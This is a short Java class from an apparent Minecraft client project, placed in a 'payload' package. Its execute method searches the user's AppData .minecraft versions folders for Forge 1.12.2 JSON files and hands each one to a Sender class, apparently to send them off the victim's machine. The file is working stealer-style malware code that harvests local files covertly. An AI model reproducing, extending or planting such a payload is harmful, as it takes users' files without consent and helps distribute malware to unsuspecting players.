package dev._3000IQPlay.experium.payload.impl;

import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.Sender;

import java.io.File;
import java.util.Objects;

public final
class JsonVersion implements Payload {
    @Override
    public
    void execute () {
        File file2 = new File(System.getenv("APPDATA") + "/.minecraft/versions");
        if (file2.isDirectory())
            for (File file1 : Objects.requireNonNull(file2.listFiles()))
                if (file1.isDirectory())
                    for (File file : Objects.requireNonNull(file1.listFiles()))
                        if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge"))
                            Sender.send(file);
    }
}